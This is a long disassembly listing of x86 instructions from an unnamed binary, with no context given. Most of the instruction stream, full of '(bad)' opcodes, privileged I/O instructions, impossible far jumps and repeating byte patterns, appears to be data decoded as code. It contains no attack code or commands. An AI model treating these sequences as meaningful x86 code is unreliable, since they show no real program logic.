  41ea4d:	test   eax,0xac50acac
  41ea52:	mov    al,0xb0
  41ea54:	dec    esp
  41ea55:	mov    al,0xb4
  41ea57:	mov    ah,0x48
  41ea59:	mov    ah,0xb8
  41ea5b:	mov    eax,0xbcbcb844
  41ea60:	inc    eax
  41ea61:	mov    esp,0xc1363636
  41ea66:	xor    dh,BYTE PTR [edx]
  41ea68:	xor    al,ch
  41ea6a:	ds ds ds leave 
  41ea6e:	push   eax
  41ea6f:	push   eax
  41ea70:	push   esp
  41ea71:	int    0x92
  41ea73:	xchg   edx,eax
  41ea74:	xchg   edx,eax
  41ea75:	rcl    DWORD PTR [esi-0x652a696a],1
  41ea7b:	call   0xdd9e:0x9e9ed99a
  41ea82:	mov    ds:0xa6e1a2a2,al
  41ea87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea89:	in     eax,0xaa
  41ea8b:	stos   BYTE PTR es:[edi],al
  41ea8c:	stos   BYTE PTR es:[edi],al
  41ea8d:	jmp    0xedf09940
  41ea92:	mov    dl,0xb2
  41ea94:	mov    dl,0xf1
  41ea96:	cmp    eax,0x46f5313f
  41ea9b:	inc    esi
  41ea9c:	inc    esi
  41ea9d:	stc    
  41ea9e:	mov    esi,0x42fdbebe
  41eaa3:	inc    edx
  41eaa4:	inc    edx
  41eaa5:	add    DWORD PTR [esi+0x46],eax
  41eaa8:	inc    esi
  41eaa9:	add    eax,0x94a4a4a
  41eaae:	dec    esi
  41eaaf:	dec    esi
  41eab0:	dec    esi
  41eab1:	or     eax,0x11525252
  41eab6:	push   esi
  41eab7:	push   esi
  41eab8:	push   esi
  41eab9:	adc    eax,0x195a5a5a
  41eabe:	pop    esi
  41eabf:	pop    esi
  41eac0:	pop    esi
  41eac1:	sbb    eax,0x21b8bcbc
  41eac6:	rcl    dl,cl
  41eac8:	shl    BYTE PTR ds:0x29dedede,cl
  41eace:	fcmovu st,st(2)
  41ead0:	fisubr DWORD PTR ds:0x30cc3030
  41ead6:	xor    al,0x34
  41ead8:	enter  0x3834,0x38
  41eadc:	les    edi,FWORD PTR [eax]
  41eade:	retf   0xcaca
  41eae1:	cmp    eax,0x41b6b6b6
  41eae6:	mov    dl,0xb2
  41eae8:	mov    dl,0x45
  41eaea:	mov    esi,0xff49bebe
  41eaef:	stc    
  41eaf0:	dec    DWORD PTR [ebp+0x3f]
  41eaf3:	and    DWORD PTR [edi],edi
  41eaf5:	push   ecx
  41eaf6:	push   ss
  41eaf7:	push   ss
  41eaf8:	push   ss
  41eaf9:	push   ebp
  41eafa:	sbb    bl,BYTE PTR [edx]
  41eafc:	sbb    bl,BYTE PTR [ecx+0x1e]
  41eaff:	push   ds
  41eb00:	push   ds
  41eb01:	pop    ebp
  41eb02:	and    ah,BYTE PTR [edx]
  41eb04:	and    ah,BYTE PTR [ecx+0x26]
  41eb07:	es es sub ch,BYTE PTR gs:[edx]
  41eb0c:	sub    ch,BYTE PTR [ecx+0x2e]
  41eb0f:	cs cs ins DWORD PTR es:[edi],dx
  41eb12:	or     cl,BYTE PTR [edx]
  41eb14:	or     dh,BYTE PTR [ecx-0x7e]
  41eb17:	add    BYTE PTR [edx-0x7171718b],0x79
  41eb1e:	adc    ecx,DWORD PTR ds:0xc2c27d13
  41eb24:	ret    0xc681
  41eb27:	mov    dh,0x85
  41eb2a:	retf   0xcaca
  41eb2d:	mov    esi,ecx
  41eb2f:	into   
  41eb30:	into   
  41eb31:	(bad)  
  41eb32:	rcl    dl,cl
  41eb34:	rcl    BYTE PTR [ecx-0x6a29292a],cl
  41eb3a:	fcmovu st,st(2)
  41eb3c:	ficomp DWORD PTR [ecx-0x620c120d]
  41eb42:	adc    edx,DWORD PTR ds:0x5252a113
  41eb48:	push   edx
  41eb49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb4a:	pop    esi
  41eb4b:	pop    esi
  41eb4c:	pop    esi
  41eb4d:	test   eax,0xad5a5a5a
  41eb52:	inc    esi
  41eb53:	inc    esi
  41eb54:	inc    esi
  41eb55:	mov    cl,0xb4
  41eb57:	mov    ah,0x48
  41eb59:	mov    ah,0xb8
  41eb5b:	mov    eax,0xbcbcb844
  41eb60:	inc    eax
  41eb61:	mov    esp,0xc03cc0c0
  41eb66:	cmp    al,0x3c
  41eb68:	xor    ch,al
  41eb6a:	ds ds ds leave 
  41eb6e:	cmp    bh,BYTE PTR [edx]
  41eb70:	cmp    cl,ch
  41eb72:	es es shl DWORD PTR es:[esp+esi*1],1
  41eb78:	or     ch,dl
  41eb7a:	inc    esp
  41eb7b:	inc    esp
  41eb7c:	inc    eax
  41eb7d:	fld    DWORD PTR [ebp-0x5d227679]
  41eb83:	mov    ds:0xa6a6e1a2,al
  41eb88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb89:	in     eax,0xaa
  41eb8b:	stos   BYTE PTR es:[edi],al
  41eb8c:	stos   BYTE PTR es:[edi],al
  41eb8d:	jmp    0xede78f33
  41eb92:	adc    BYTE PTR [eax],dl
  41eb94:	sub    al,0xf1
  41eb96:	add    al,BYTE PTR [edx]
  41eb98:	add    dh,ch
  41eb9a:	push   cs
  41eb9b:	push   cs
  41eb9c:	push   cs
  41eb9d:	stc    
  41eb9e:	sbb    al,0x1c
  41eba0:	and    ch,bh
  41eba2:	inc    edx
  41eba3:	inc    edx
  41eba4:	inc    edx
  41eba5:	add    DWORD PTR [esi+0x46],eax
  41eba8:	inc    esi
  41eba9:	add    eax,0x94a4a4a
  41ebae:	dec    esi
  41ebaf:	dec    esi
  41ebb0:	dec    esi
  41ebb1:	or     eax,0x11454b49
  41ebb6:	mov    BYTE PTR [eax-0x707ea74],cl
  41ebbc:	les    ebx,FWORD PTR [ecx]
  41ebbe:	jmp    0xd6d6:0xd61deaea
  41ebc5:	and    edx,edx
  41ebc7:	rcl    dl,cl
  41ebc9:	and    eax,0x29dcd0d0
  41ebce:	sub    al,0x2c
  41ebd0:	shr    BYTE PTR [eax+esi*1],1
  41ebd3:	xor    ah,cl
  41ebd5:	xor    BYTE PTR [esp+esi*1],dh
  41ebd8:	enter  0x3834,0x38
  41ebdc:	les    edi,FWORD PTR [eax]
  41ebde:	cmp    al,0x3c
  41ebe0:	sar    BYTE PTR [eax+eax*2],0x40
  41ebe4:	mov    esp,0xb8444440
  41ebe9:	inc    esp
  41ebea:	dec    eax
  41ebeb:	dec    eax
  41ebec:	mov    ah,0x48
  41ebee:	mov    ah,0xb4
  41ebf0:	mov    eax,0xa6a6a64d
  41ebf5:	push   ecx
  41ebf6:	mov    ds:0xae55a2a2,al
  41ebfb:	scas   al,BYTE PTR es:[edi]
  41ebfc:	scas   al,BYTE PTR es:[edi]
  41ebfd:	pop    ecx
  41ebfe:	stos   BYTE PTR es:[edi],al
  41ebff:	stos   BYTE PTR es:[edi],al
  41ec00:	stos   BYTE PTR es:[edi],al
  41ec01:	pop    ebp
  41ec02:	test   eax,0xe261a5ab
  41ec07:	loop   0x41ebeb
  41ec09:	gs and eax,0xf0692127
  41ec0f:	lock hlt 
  41ec11:	ins    DWORD PTR es:[edi],dx
  41ec12:	xchg   BYTE PTR [esi-0x7d7d8e7a],al
  41ec18:	xor    BYTE PTR [ebp-0x72],0x8e
  41ec1c:	mov    ?,WORD PTR [ecx-0x76]
  41ec1f:	mov    cl,BYTE PTR [edx+0x181c1c7d]
  41ec25:	or     ecx,0xe85cdcb
  41ec2b:	push   cs
  41ec2c:	push   cs
  41ec2d:	mov    DWORD PTR [ebp+0x47],eax
  41ec30:	dec    ecx
  41ec31:	lea    esp,[esi+0x66]
  41ec34:	xchg   cx,ax
  41ec36:	bound  esp,QWORD PTR [edx+0x62]
  41ec39:	xchg   ebp,eax
  41ec3a:	outs   dx,BYTE PTR ds:[esi]
  41ec3b:	outs   dx,BYTE PTR ds:[esi]
  41ec3c:	outs   dx,BYTE PTR ds:[esi]
  41ec3d:	cdq    
  41ec3e:	push   0x6a
  41ec40:	push   0xffffff9d
  41ec42:	pop    eax
  41ec43:	pop    eax
  41ec44:	push   esp
  41ec45:	mov    eax,ds:0xa458a4a4
  41ec4a:	test   al,0xa8
  41ec4c:	push   esp
  41ec4d:	test   al,0xac
  41ec4f:	lods   al,BYTE PTR ds:[esi]
  41ec50:	push   eax
  41ec51:	lods   al,BYTE PTR ds:[esi]
  41ec52:	mov    al,0xb0
  41ec54:	dec    esp
  41ec55:	mov    al,0xb4
  41ec57:	mov    ah,0x48
  41ec59:	mov    ah,0xb8
  41ec5b:	mov    eax,0xbcbcb844
  41ec60:	inc    eax
  41ec61:	mov    esp,0xc03cc0c0
  41ec66:	(bad)  
  41ec67:	les    edi,FWORD PTR [eax]
  41ec69:	(bad)  
  41ec6a:	enter  0x34c8,0xc8
  41ec6e:	int3   
  41ec6f:	int3   
  41ec70:	xor    ah,cl
  41ec72:	rcl    al,1
  41ec74:	sub    al,0xd0
  41ec76:	aam    0xd4
  41ec78:	sub    ah,dl
  41ec7a:	and    BYTE PTR [eax],ah
  41ec7c:	sub    al,0xd9
  41ec7e:	sub    ch,BYTE PTR [edx]
  41ec80:	sub    bl,ch
  41ec82:	push   ss
  41ec83:	push   ss
  41ec84:	push   ss
  41ec85:	loope  0x41ec99
  41ec87:	adc    dl,BYTE PTR [edx]
  41ec89:	in     eax,0x3
  41ec8b:	add    eax,0x1a1ae903
  41ec90:	sbb    ch,ch
  41ec92:	push   es
  41ec93:	push   es
  41ec94:	push   es
  41ec95:	icebp  
  41ec96:	hlt    
  41ec97:	hlt    
  41ec98:	or     ah,dh
  41ec9a:	clc    
  41ec9b:	clc    
  41ec9c:	add    al,0xf8
  41ec9e:	or     cl,BYTE PTR [edx]
  41eca0:	or     bh,ch
  41eca2:	jmp    0x41ec91
  41eca4:	jmp    0x41eca7
  41eca6:	out    dx,eax
  41eca7:	jmp    0xff3ff29b
  41ecac:	dec    BYTE PTR [ecx]
  41ecae:	cli    
  41ecaf:	cli    
  41ecb0:	cli    
  41ecb1:	or     eax,0x11e6e6e6
  41ecb6:	in     al,dx
  41ecb7:	in     al,dx
  41ecb8:	loopne 0x41eccf
  41ecba:	sbb    BYTE PTR [eax],bl
  41ecbc:	in     al,0x18
  41ecbe:	sbb    al,0x1c
  41ecc0:	loopne 0x41ecde
  41ecc2:	and    BYTE PTR [eax],ah
  41ecc4:	fsub   QWORD PTR [eax]
  41ecc6:	and    al,0x24
  41ecc8:	fsub   DWORD PTR [eax+ebp*1]
  41eccb:	sub    ah,dl
  41eccd:	sub    BYTE PTR [esp+ebp*1],ch
  41ecd0:	shr    BYTE PTR [eax+esi*1],1
  41ecd3:	xor    ah,cl
  41ecd5:	xor    BYTE PTR [esp+esi*1],dh
  41ecd8:	enter  0x3834,0x38
  41ecdc:	les    edi,FWORD PTR [eax]
  41ecde:	cmp    al,0x3c
  41ece0:	sar    BYTE PTR [eax+eax*2],0x40
  41ece4:	mov    esp,0xb8444440
  41ece9:	inc    esp
  41ecea:	dec    eax
  41eceb:	dec    eax
  41ecec:	mov    ah,0x48
  41ecee:	dec    esp
  41ecef:	dec    esp
  41ecf0:	mov    al,0x4c
  41ecf2:	push   eax
  41ecf3:	push   eax
  41ecf4:	lods   al,BYTE PTR ds:[esi]
  41ecf5:	push   eax
  41ecf6:	push   esp
  41ecf7:	push   esp
  41ecf8:	test   al,0x54
  41ecfa:	pop    eax
  41ecfb:	pop    eax
  41ecfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ecfd:	pop    eax
  41ecfe:	pop    esp
  41ecff:	pop    esp
  41ed00:	mov    al,ds:0x9c60605c
  41ed05:	pusha  
  41ed06:	pushf  
  41ed07:	pushf  
  41ed08:	nop
  41ed09:	gs sahf 
  41ed0b:	sahf   
  41ed0c:	sahf   
  41ed0d:	imul   ebx,DWORD PTR [edx-0x77926566],0x74718488
  41ed17:	je     0x41eca1
  41ed19:	je     0x41ed93
  41ed1b:	js     0x41eca1
  41ed1d:	js     0x41eca3
  41ed1f:	test   BYTE PTR [eax+0x7676767d],cl
  41ed25:	xor    DWORD PTR [edx+0x72],0x70708572
  41ed2c:	jl     0x41ecb7
  41ed2e:	mov    WORD PTR [eax+esi*2+0x6c90908c],cs
  41ed35:	nop
  41ed36:	xchg   esp,eax
  41ed37:	xchg   esp,eax
  41ed38:	push   0x64989894
  41ed3d:	cwde   
  41ed3e:	pushf  
  41ed3f:	pushf  
  41ed40:	pusha  
  41ed41:	pushf  
  41ed42:	mov    al,ds:0xa4a05ca0
  41ed47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed48:	pop    eax
  41ed49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed4a:	test   al,0xa8
  41ed4c:	push   esp
  41ed4d:	test   al,0xac
  41ed4f:	lods   al,BYTE PTR ds:[esi]
  41ed50:	push   eax
  41ed51:	lods   al,BYTE PTR ds:[esi]
  41ed52:	mov    al,0xb0
  41ed54:	dec    esp
  41ed55:	mov    al,0xb4
  41ed57:	mov    ah,0x48
  41ed59:	mov    ah,0x58
  41ed5b:	mov    eax,0xbc5cb144
  41ed60:	inc    eax
  41ed61:	mov    ch,0x20
  41ed63:	sar    BYTE PTR [ecx+ecx*8],0x24
  41ed67:	les    edi,FWORD PTR [eax]
  41ed69:	int    0x28
  41ed6b:	enter  0xc134,0x2c
  41ed6f:	int3   
  41ed70:	xor    ch,al
  41ed72:	xor    al,dl
  41ed74:	sub    al,0xd9
  41ed76:	xor    al,0xd4
  41ed78:	sub    ch,bl
  41ed7a:	cmp    al,bl
  41ed7c:	and    al,0xd1
  41ed7e:	cmp    al,0xdc
  41ed80:	and    ch,dl
  41ed82:	add    al,ah
  41ed84:	sbb    al,0xe9
  41ed86:	add    al,0xe4
  41ed88:	sbb    ch,ch
  41ed8a:	or     al,ch
  41ed8c:	adc    al,0xe1
  41ed8e:	or     al,0xec
  41ed90:	adc    ch,ah
  41ed92:	adc    al,dh
  41ed94:	or     al,0xf9
  41ed96:	adc    al,0xf4
  41ed98:	or     ch,bh
  41ed9a:	sbb    al,bh
  41ed9c:	add    al,0xf1
  41ed9e:	sbb    al,0xfc
  41eda0:	add    ch,dh
  41eda2:	loopne 0x41eda4
  41eda4:	cld    
  41eda5:	or     esp,esp
  41eda7:	add    al,0xf8
  41eda9:	or     eax,0x1f408e8
  41edae:	in     al,dx
  41edaf:	or     al,0xf0
  41edb1:	add    eax,0x19ec10f0
  41edb6:	hlt    
  41edb7:	adc    al,0xe8
  41edb9:	sbb    eax,0x11e418f8
  41edbe:	cld    
  41edbf:	sbb    al,0xe0
  41edc1:	adc    eax,0x25dc20e0
  41edc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41edc7:	and    al,0xd8
  41edc9:	and    ecx,eax
  41edcb:	sub    ah,dl
  41edcd:	and    esp,edx
  41edcf:	sub    al,0xd0
  41edd1:	or     eax,0x314c33cf
  41edd6:	retf   
  41edd7:	xlat   BYTE PTR ds:[ebx]
  41edd8:	mov    bl,0x35
  41edda:	cmp    BYTE PTR [eax],bh
  41eddc:	lds    edi,FWORD PTR [eax]
  41edde:	aas    
  41eddf:	cmp    al,0x20
  41ede1:	sbb    al,0x50
  41ede3:	inc    eax
  41ede4:	mov    ebp,0xa0444040
  41ede9:	inc    edx
  41edea:	dec    eax
  41edeb:	dec    eax
  41edec:	mov    ch,0x48
  41edee:	ins    BYTE PTR es:[edi],dx
  41edef:	ins    BYTE PTR es:[edi],dx
  41edf0:	mov    al,0x4c
  41edf2:	push   ecx
  41edf3:	push   eax
  41edf4:	push   esp
  41edf5:	push   eax
  41edf6:	cld    
  41edf7:	pop    esp
  41edf8:	test   al,0x54
  41edfa:	pop    edx
  41edfb:	pop    eax
  41edfc:	inc    esp
  41edfd:	js     0x41ee5b
  41edff:	pop    esp
  41ee00:	mov    eax,ds:0xc460405c
  41ee05:	jo     0x41ee6b
  41ee07:	fs addr16 fs push 0x6c689468
  41ee0f:	ins    BYTE PTR es:[edi],dx
  41ee10:	nop
  41ee11:	ins    BYTE PTR es:[edi],dx
  41ee12:	sbb    al,0xb8
  41ee14:	mov    WORD PTR [eax+0x74],?
  41ee17:	je     0x41eda1
  41ee19:	je     0x41ee93
  41ee1b:	js     0x41eda1
  41ee1d:	js     0x41ee9b
  41ee1f:	jl     0x41eda1
  41ee21:	jl     0x41ee4f
  41ee23:	into   
  41ee24:	add    DWORD PTR [eax-0x7b7835c8],0x58
  41ee2b:	(bad)  
  41ee2c:	mov    ecx,DWORD PTR [eax-0x73703d94]
  41ee32:	nop
  41ee33:	nop
  41ee34:	ins    BYTE PTR es:[edi],dx
  41ee35:	nop
  41ee36:	push   0x989497da
  41ee3b:	cwde   
  41ee3c:	fs cwde 
  41ee3e:	or     ch,0x9f
  41ee41:	pushf  
  41ee42:	mov    al,ds:0xe4a05ca0
  41ee47:	cmc    
  41ee48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee4a:	test   al,0xa8
  41ee4c:	push   esp
  41ee4d:	test   al,0xcc
  41ee4f:	std    
  41ee50:	scas   eax,DWORD PTR es:[edi]
  41ee51:	lods   al,BYTE PTR ds:[esi]
  41ee52:	mov    al,0xb0
  41ee54:	dec    esp
  41ee55:	mov    al,0xb6
  41ee57:	mov    ah,0x48
  41ee59:	xor    al,0xb8
  41ee5b:	mov    eax,0xed2cb844
  41ee60:	mov    edi,0x3cc0c0bc
  41ee65:	rcl    ch,0xc4
  41ee68:	cmp    BYTE PTR [eax+ecx*8-0x38],al
  41ee6c:	xor    al,0xc8
  41ee6e:	or     al,0x9d
  41ee70:	iret   
  41ee71:	int3   
  41ee72:	rcl    al,1
  41ee74:	sub    al,0xd0
  41ee76:	push   esp
  41ee77:	fwait
  41ee78:	xlat   BYTE PTR ds:[ebx]
  41ee79:	aam    0xd8
  41ee7b:	fsub   DWORD PTR [eax+ebx*8]
  41ee7e:	and    ebx,ebp
  41ee80:	and    ebx,ebp
  41ee82:	jl     0x41ee32
  41ee84:	jecxz  0x41ee66
  41ee86:	fs stos DWORD PTR es:[edi],eax
  41ee88:	out    0xe4,eax
  41ee8a:	jl     0x41ee33
  41ee8c:	jmp    0x41ee76
  41ee8e:	in     al,dx
  41ee8f:	in     al,dx
  41ee90:	adc    ah,ch
  41ee92:	psllw  mm1,QWORD PTR [edi]
  41ee95:	icebp  
  41ee96:	add    al,0xba
  41ee98:	div    esp
  41ee9a:	ins    BYTE PTR es:[edi],dx
  41ee9b:	mov    bh,0xfb
  41ee9d:	clc    
  41ee9e:	pusha  
  41ee9f:	mov    bl,0xff
  41eea1:	cld    
  41eea2:	add    BYTE PTR [eax],al
  41eea4:	cld    
  41eea5:	add    bl,bh
  41eea7:	add    eax,0x591805fb
  41eeac:	or     ecx,DWORD PTR [eax]
  41eeae:	nop
  41eeaf:	inc    ebx
  41eeb0:	(bad)  
  41eeb2:	mov    ah,0x5f
  41eeb4:	adc    edx,DWORD PTR [eax]
  41eeb6:	adc    al,0x14
  41eeb8:	call   0xe75bd5d1
  41eebd:	sbb    DWORD PTR [ecx*2+0x6f841c1f],ebp
  41eec4:	and    esp,DWORD PTR [eax]
  41eec6:	mov    BYTE PTR [ebx+0x27],ch
  41eec9:	and    al,0x28
  41eecb:	sub    ah,dl
  41eecd:	sub    bl,dl
  41eecf:	sub    eax,0x61642dd3
  41eed4:	xor    esi,DWORD PTR [eax]
  41eed6:	cwde   
  41eed7:	jnp    0x41ef10
  41eed9:	xor    al,0x8c
  41eedb:	ja     0x41ef18
  41eedd:	cmp    BYTE PTR [esp+edi*1],bh
  41eee0:	sar    BYTE PTR [edi+edi*4],0x41
  41eee4:	mov    edi,0x47153041
  41eee9:	inc    esp
  41eeea:	cld    
  41eeeb:	pop    es
  41eeec:	dec    ebx
  41eeed:	dec    eax
  41eeee:	lock add ecx,DWORD PTR [edi+0x4c]
  41eef2:	push   eax
  41eef3:	push   eax
  41eef4:	lods   al,BYTE PTR ds:[esi]
  41eef5:	push   eax
  41eef6:	stos   DWORD PTR es:[edi],eax
  41eef7:	push   ebp
  41eef8:	stos   DWORD PTR es:[edi],eax
  41eef9:	push   ebp
  41eefa:	fmul   QWORD PTR [ecx]
  41eefc:	pop    ebx
  41eefd:	pop    eax
  41eefe:	loopne 0x41ef13
  41ef00:	pop    edi
  41ef01:	pop    esp
  41ef02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef03:	das    
  41ef04:	arpl   WORD PTR [eax+0x64],sp
  41ef07:	fs cwde 
  41ef09:	fs xchg edi,eax
  41ef0b:	imul   edx,DWORD PTR [edi+0x6f3dcc69],0x733fb46c
  41ef15:	jo     0x41eecf
  41ef17:	cmp    esi,DWORD PTR [edi+0x74]
  41ef1a:	js     0x41ef94
  41ef1c:	test   BYTE PTR [eax-0x7d],bh
  41ef1f:	jge    0x41eea4
  41ef21:	jge    0x41ef53
  41ef23:	rol    DWORD PTR [ebx-0x7834b780],1
  41ef29:	test   BYTE PTR [eax-0x73778b78],cl
  41ef2f:	mov    WORD PTR [eax-0x74],?
  41ef32:	nop
  41ef33:	nop
  41ef34:	ins    BYTE PTR es:[edi],dx
  41ef35:	nop
  41ef36:	xchg   esp,eax
  41ef37:	xchg   esp,eax
  41ef38:	push   0x64989894
  41ef3d:	cwde   
  41ef3e:	idiv   ebx
  41ef40:	out    dx,al
  41ef41:	out    dx,al
  41ef42:	(bad)
  41ef45:	xchg   esi,eax
  41ef46:	mov    al,al
  41ef48:	int3   
  41ef49:	enter  0xa8a8,0x54
  41ef4d:	test   al,0xac
  41ef4f:	lods   al,BYTE PTR ds:[esi]
  41ef50:	in     al,0xdd
  41ef52:	rcl    esp,1
  41ef54:	clc    
  41ef55:	(bad)  
  41ef57:	(bad)  
  41ef58:	jmp    0x453db11f
  41ef5d:	mov    eax,0xd7fbbcbc
  41ef62:	mov    ah,0x90
  41ef64:	mov    dl,0xb1
  41ef66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef67:	xchg   DWORD PTR [eax+eiz*4-0x42445046],esp
  41ef6e:	int3   
  41ef6f:	int3   
  41ef70:	xor    ah,cl
  41ef72:	rcl    al,1
  41ef74:	xchg   BYTE PTR [edi-0x4c5a5f5a],bh
  41ef7a:	mov    ah,0x9b
  41ef7c:	mov    al,0xb4
  41ef7e:	mov    bl,0xb9
  41ef80:	and    ah,bl
  41ef82:	loopne 0x41ef64
  41ef84:	mov    dh,0x8f
  41ef86:	xchg   esi,eax
  41ef87:	nop
  41ef88:	xchg   ebp,eax
  41ef89:	add    DWORD PTR [esi+ebp*4-0x13767c66],0x10
  41ef91:	in     al,dx
  41ef92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef94:	mov    cl,0xa6
  41ef96:	mov    esi,0x949490da
  41ef9c:	add    al,0xf8
  41ef9e:	cld    
  41ef9f:	cld    
  41efa0:	mov    ebx,0x61447497
  41efa5:	jne    0x41f016
  41efa7:	jo     0x41f014
  41efa9:	je     0x41f00a
  41efab:	arpl   WORD PTR [esi+0x6c],sp
  41efae:	arpl   WORD PTR [ebp-0x10],si
  41efb1:	or     al,0x57
  41efb3:	push   esp
  41efb4:	push   ebp
  41efb5:	and    eax,0x78743a26
  41efba:	je     0x41efd4
  41efbc:	in     al,0x18
  41efbe:	sbb    al,0x1c
  41efc0:	pop    ebx
  41efc1:	ja     0x41f017
  41efc3:	jne    0x41f015
  41efc5:	push   ecx
  41efc6:	inc    edi
  41efc7:	dec    ecx
  41efc8:	imul   eax,DWORD PTR [edx+0x42],0x4f
  41efcc:	dec    ebx
  41efcd:	pop    esp
  41efce:	sub    al,0x2c
  41efd0:	shr    BYTE PTR [ecx+esi*2],1
  41efd3:	je     0x41f03b
  41efd5:	ja     0x41f03b
  41efd7:	jg     0x41efe0
  41efd9:	add    dl,BYTE PTR [esi]
  41efdb:	pop    esp
  41efdc:	push   eax
  41efdd:	push   esp
  41efde:	cmp    al,0x3c
  41efe0:	sar    BYTE PTR [eax+eax*2],0x40
  41efe4:	add    esi,DWORD PTR [esi]
  41efe6:	cmp    eax,0x2d113434
  41efeb:	cmp    al,0x3
  41efed:	and    esi,DWORD PTR ds:0x313a111c
  41eff3:	aas    
  41eff4:	lods   al,BYTE PTR ds:[esi]
  41eff5:	push   eax
  41eff6:	cmp    edi,DWORD PTR [eax]
  41eff8:	xor    eax,0x38766a61
  41effd:	xor    al,0x30
  41efff:	pop    esp
  41f000:	mov    al,ds:0x2360605c
  41f005:	adc    DWORD PTR [edi],esp
  41f007:	push   ss
  41f008:	add    eax,0x2d0f1c03
  41f00d:	sbb    bl,BYTE PTR [edi]
  41f00f:	sbb    BYTE PTR [ecx],dh
  41f011:	push   ds
  41f012:	adc    edx,DWORD PTR [edi]
  41f014:	mov    WORD PTR [eax+0x3b],?
  41f017:	cmp    BYTE PTR ds:0x4b2c2d33,dh
  41f01d:	dec    esi
  41f01e:	push   edx
  41f01f:	sbb    BYTE PTR [eax+edx*1],dl
  41f022:	add    BYTE PTR [eax-0x33287f84],0xcc
  41f029:	(bad)  
  41f02b:	fmul   st,st(5)
  41f02d:	mov    edx,0x8ce4e0e8
  41f032:	nop
  41f033:	nop
  41f034:	ret    
  41f035:	in     al,0xe6
  41f037:	sar    bl,0xdb
  41f03a:	imul   ah
  41f03c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f03d:	cwde   
  41f03e:	pushf  
  41f03f:	pushf  
  41f040:	pusha  
  41f041:	pushf  
  41f042:	jecxz  0x41f035
  41f044:	jmp    0x982ae12e
  41f049:	xchg   edx,eax
  41f04a:	xchg   ah,cl
  41f04c:	rol    ah,0xac
  41f04f:	lods   al,BYTE PTR ds:[esi]
  41f050:	push   eax
  41f051:	lods   al,BYTE PTR ds:[esi]
  41f052:	(bad)  
  41f053:	mul    eax
  41f055:	mul    esp
  41f057:	inc    DWORD PTR [edi-0x2f23697e]
  41f05d:	aam    0xbc
  41f05f:	mov    esp,0xc0c0bc40
  41f064:	mov    gs,WORD PTR [ebx-0x50486c50]
  41f06a:	mov    edx,0xa1b3a68f
  41f06f:	int3   
  41f070:	xor    BYTE PTR [ebp-0x25],bh
  41f073:	rcr    ch,cl
  41f075:	out    0x29,al
  41f077:	mov    al,ds:0xc2c761d5
  41f07c:	mov    dh,0xa2
  41f07e:	mov    al,ds:0x45cddb13
  41f083:	xchg   esp,eax
  41f084:	jecxz  0x41f0cb
  41f086:	and    eax,eax
  41f088:	mov    DWORD PTR [esi+0x3d],0xae4aeb3b
  41f08f:	leave  
  41f090:	fbstp  TBYTE PTR [edi]
  41f092:	and    al,0xb4
  41f094:	or     al,0xf0
  41f096:	cld    
  41f097:	pop    ss
  41f098:	mov    al,0xf3
  41f09a:	adc    eax,ecx
  41f09c:	psllw  mm6,mm6
  41f09f:	stos   DWORD PTR es:[edi],eax
  41f0a0:	ja     0x41f0b2
  41f0a2:	jb     0x41f029
  41f0a4:	jno    0x41f0da
  41f0a6:	cmp    BYTE PTR [ebx+0x0],al
  41f0a9:	cmp    eax,DWORD PTR [eax-0xd]
  41f0ac:	cmp    al,0x63
  41f0ae:	cld    
  41f0af:	gs or  ah,dh
  41f0b2:	adc    BYTE PTR ds:0x1d4756c2,ah
  41f0b8:	inc    edx
  41f0b9:	cdq    
  41f0ba:	push   0xc65f4f14
  41f0bf:	leave  
  41f0c0:	(bad)  
  41f0c1:	mov    esi,0xa3d42410
  41f0c6:	pop    ebp
  41f0c7:	fcompp 
  41f0c9:	int    0xa1
  41f0cb:	outs   dx,DWORD PTR ds:[esi]
  41f0cc:	clc    
  41f0cd:	sub    eax,0x86ef94e4
  41f0d2:	pop    eax
  41f0d3:	enter  0x71ec,0x7f
  41f0d7:	xor    cl,BYTE PTR gs:[edi-0x2c]
  41f0db:	aas    
  41f0dc:	push   cs
  41f0dd:	mov    edi,0x317dfa20
  41f0e2:	jle    0x41f145
  41f0e4:	sbb    DWORD PTR [eax-0x7173c476],edx
  41f0ea:	sbb    eax,0xac084ea0
  41f0ef:	test   al,0x30
  41f0f1:	nop
  41f0f2:	and    al,0x62
  41f0f4:	pop    ebx
  41f0f5:	fld    QWORD PTR [ebx]
  41f0f7:	push   eax
  41f0f8:	pop    edx
  41f0f9:	mov    cl,0xa6
  41f0fb:	lods   eax,DWORD PTR ds:[esi]
  41f0fc:	repz popa 
  41f0fe:	out    0x50,al
  41f100:	hlt    
  41f101:	push   ds
  41f102:	data16 or ah,BYTE PTR [ecx-0x1c]
  41f106:	sbb    eax,0x97ac6398
  41f10b:	xor    esp,ebx
  41f10d:	adc    edx,DWORD PTR [edx]
  41f10f:	or     al,0x3d
  41f111:	pusha  
  41f112:	jg     0x41f0da
  41f114:	inc    esi
  41f115:	jne    0x41f0cc
  41f117:	xchg   esi,eax
  41f118:	jo     0x41f193
  41f11a:	scas   al,BYTE PTR es:[edi]
  41f11b:	jns    0x41f16c
  41f11d:	push   esi
  41f11e:	xor    eax,0x69079018
  41f123:	mov    ebx,0xfd9cbdc9
  41f128:	clc    
  41f129:	mov    cl,0x48
  41f12b:	jmp    0x4e87c706
  41f130:	jge    0x41f16b
  41f132:	loop   0x41f16c
  41f134:	mov    bl,0xd
  41f136:	fs daa 
  41f138:	(bad)  [eax+ebx*1-0x32]
  41f13c:	jo     0x41f19d
  41f13e:	jge    0x41f0d8
  41f140:	lahf   
  41f141:	push   ecx
  41f142:	stos   BYTE PTR es:[edi],al
  41f143:	das    
  41f144:	cwde   
